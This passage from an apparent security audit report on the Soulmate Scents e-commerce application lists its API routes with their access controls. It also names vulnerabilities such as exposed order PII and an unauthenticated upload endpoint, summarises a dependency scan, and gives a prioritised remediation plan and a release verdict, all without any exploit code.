| **Moderate Reviews** | `superadmin`, `admin` | `authorize(ROLES.ADMIN)` | **PASS** — Admin restricted |

---

## Section F — Complete API Route Inventory & Security Matrix

| Method | Endpoint | Auth | Required Role / Perm | Input Validation | Rate Limit | Primary Concerns |
| :--- | :--- | :---: | :---: | :---: | :---: | :--- |
| `POST` | `/api/v1/auth/login` | None | Public | Zod | Global (200/15m) | Account enumeration via response messages |
| `GET` | `/api/v1/auth/me` | JWT | Any Active User | None | Global | None |
| `POST` | `/api/v1/auth/logout` | JWT | Any Active User | None | Global | Token not blacklisted |
| `GET` | `/api/v1/users` | JWT | `MANAGE_USERS` | Query Zod | Global | None |
| `POST` | `/api/v1/users` | JWT | `MANAGE_USERS` | Body Zod | Global | None |
| `PATCH` | `/api/v1/users/:id/password` | JWT | Self or Superadmin | Body Zod | Global | Missing token revocation |
| `GET` | `/api/v1/products` | None | Public | Query Zod | Global | None |
| `GET` | `/api/v1/products/:id` | None | Public | Param Zod | Global | None |
| `POST` | `/api/v1/products` | JWT | `admin` | Body Zod | Global | Blocks `scent_specialist` |
| `PUT` | `/api/v1/products/:id` | JWT | `admin` | Body Zod | Global | Blocks `scent_specialist` |
| `DELETE` | `/api/v1/products/:id` | JWT | `admin` | Param Zod | Global | Blocks `scent_specialist` |
| `GET` | `/api/v1/inventory` | JWT | `admin` | Query Zod | Global | Blocks `inventory_manager` |
| `PATCH` | `/api/v1/inventory/:id/stock`| JWT | `admin` | Body Zod | Global | Blocks `inventory_manager` |
| `POST` | `/api/v1/orders` | None | Public | Body Zod | Checkout (10/15m) | Fallback catalog pricing & phantom stock |
| `GET` | `/api/v1/orders/confirmation/:num`| None | Public | Param Zod | Global | **IDOR: Customer PII exposed** |
| `POST` | `/api/v1/orders/:id/payment-proof`| None | Public | Body Zod | Global | **Unverified URL injection** |
| `GET` | `/api/v1/orders` | JWT | `admin` | Query Zod | Global | Blocks `staff` |
| `PATCH` | `/api/v1/orders/:id/status` | JWT | `admin` | Body Zod | Global | None |
| `POST` | `/api/v1/coupons/validate` | None | Public | Body Zod | Global | **No dedicated rate limit (Brute-force)** |
| `POST` | `/api/v1/reviews` | None | Public | Body Zod | Global | **No dedicated rate limit (Spam)** |
| `POST` | `/api/v1/newsletter/subscribe`| None | Public | Body Zod | Global | Newsletter list spam |
| `POST` | `Next.js /api/upload` | None | Public | Weak MIME | None | **Arbitrary upload & Stored XSS** |

---

## Section G — Data Protection & Privacy Assessment

### Customer Data Exposure
- `Order` schema captures customer full name, email, phone number, and detailed shipping address (`addressLine1`, `addressLine2`, `city`, `province`, `postalCode`).
- **Critical Risk:** `GET /orders/confirmation/:orderNumber` returns these records without verification, violating client confidentiality and regional privacy mandates.
- **Remediation:** Order confirmation endpoints must be protected by an authentication token or a guest verification secret.

### Credential Handling & Password Security
- Passwords are hashed using `bcryptjs` with salt work factor 12, satisfying OWASP recommendations.
- Models implement `toPublicJSON()` to strip `password` hashes before serialization.
- `JWT_SECRET` validation in `env.js` requires a minimum length of 8 characters. While sufficient for development, production requires a high-entropy secret >= 32 characters (256-bit).

---

## Section H — Dependencies & Supply Chain Security Analysis

### Automated Dependency Audit Summary
- **Backend Environment:**
  - Total dependencies: 247 packages
  - Vulnerability scan: 21 vulnerabilities found
  - Critical: `proxy-addr` GHSA-jqcg-44mw-7w3h
  - High: `zod` (ReDoS / memory consumption), `body-parser` (DoS), `brace-expansion` (ReDoS)
- **Frontend Environment:**
  - Total dependencies: 412 packages
  - Vulnerability scan: 30 vulnerabilities found
  - Critical/High: `undici` (HTTP request smuggling), `zod`, `@modelcontextprotocol/sdk`

---

## Section I — Strategic Remediation Roadmap

```mermaid
flowchart TD
    P0["Priority 0: Immediate Blockers (24-48 Hours)"]
    P1["Priority 1: Pre-Launch Remediation (3-5 Days)"]
    P2["Priority 2: Post-Launch Hardening (1-2 Weeks)"]
    P3["Priority 3: Continuous DevSecOps (Ongoing)"]

    P0 -->|Remediate| SEC1[SEC-VULN-01: Remove/Secure /api/upload]
    P0 -->|Remediate| SEC2[SEC-VULN-02: Protect Order Confirmation PII]
    P0 -->|Remediate| SEC3[SEC-VULN-03: Restrict Payment Proofs]
    P0 -->|Remediate| SEC4[SEC-VULN-04: Remove Fallback Pricing & Phantom Stock]

    P1 -->|Remediate| SEC5[SEC-VULN-05: Fix RBAC Route Middleware]
    P1 -->|Remediate| SEC6[SEC-VULN-06: Remove Hardcoded Seed Password]
    P1 -->|Remediate| SEC8[SEC-VULN-08: Add Rate Limits to Coupons & Reviews]
    P1 -->|Remediate| SEC10[SEC-VULN-10: Add Next.js Security Headers]

    P2 -->|Remediate| SEC7[SEC-VULN-07: Implement Token Invalidation on Password Change]
    P2 -->|Remediate| SEC9[SEC-VULN-09: Configure Express Trust Proxy]
    P2 -->|Remediate| SEC11[SEC-VULN-11: Upgrade Dependencies]

    P3 -->|Implement| CI[Automated SAST & Dependabot in CI/CD]
```



### Remediation Action Plan
1. **Priority 0 (Immediate Deployment Blockers):**
   - **SEC-VULN-01:** Disable or delete `frontend/src/app/api/upload/route.ts`. Replace with authenticated backend upload using `sharp` image re-encoding.
   - **SEC-VULN-02:** Protect `GET /orders/confirmation/:orderNumber` with guest token verification or customer auth check; mask PII in responses.
   - **SEC-VULN-03:** Restrict `POST /orders/:id/payment-proof` to verified guests/owners and enforce server-side image file uploads.
   - **SEC-VULN-04:** Purge fallback demo catalog pricing in `orders.service.js` and eliminate auto-creation of 50 inventory units in `inventory.service.js`.

2. **Priority 1 (Pre-Launch Mandatory):**
   - **SEC-VULN-05:** Replace `authorize(ROLES.ADMIN)` with `requirePermission()` across product, order, and inventory routes.
   - **SEC-VULN-06:** Enforce non-default `ADMIN_SEED_PASSWORD` in `seedAdmin.js` when `NODE_ENV === "production"`.
   - **SEC-VULN-08:** Add rate limiters to `POST /coupons/validate` (15 req/15m) and `POST /reviews` (5 req/15m).
   - **SEC-VULN-10:** Add standard security headers (`X-Frame-Options`, `Content-Security-Policy`, `HSTS`) in `next.config.ts`.

3. **Priority 2 & 3 (Hardening & Continuous Monitoring):**
   - Implement `tokenVersion` or `passwordChangedAt` checks in `auth.middleware.js`.
   - Configure `app.set("trust proxy", 1)` in `app.js`.
   - Execute `npm audit fix` across frontend and backend.
   - Set up automated dependency and SAST scanning in GitHub Actions.

---

## Section J — Final Assessment & Release Verdict

| Dimension | Evaluation |
| :--- | :--- |
| **Application Security Posture** | **NEEDS REMEDIATION** |
| **Confidentiality Protection** | **FAIL** (Order PII exposed via public endpoint) |
| **Integrity Protection** | **FAIL** (Unauthenticated file uploads, arbitrary payment proofs, inventory generation) |
| **Availability Protection** | **PASS WITH CONCERNS** (Global rate limiting present, but proxy trust unconfigured) |
| **Production Release Verdict** | **DO NOT RELEASE TO PRODUCTION WITHOUT REMEDIATION** |

**Conclusion:**  
Soulmate Scents displays strong foundational engineering in database abstraction, parameter pollution defenses, and password hashing. However, the identified vulnerabilities in file uploads, authorization boundaries, order confirmation exposure, and fallback checkout logic represent severe security and commercial risks. Addressing the Priority 0 and Priority 1 items in the remediation roadmap will elevate the platform to industry-standard luxury e-commerce security standards.

---
*Report generated strictly in read-only audit mode. No application source files or configuration records were altered.*

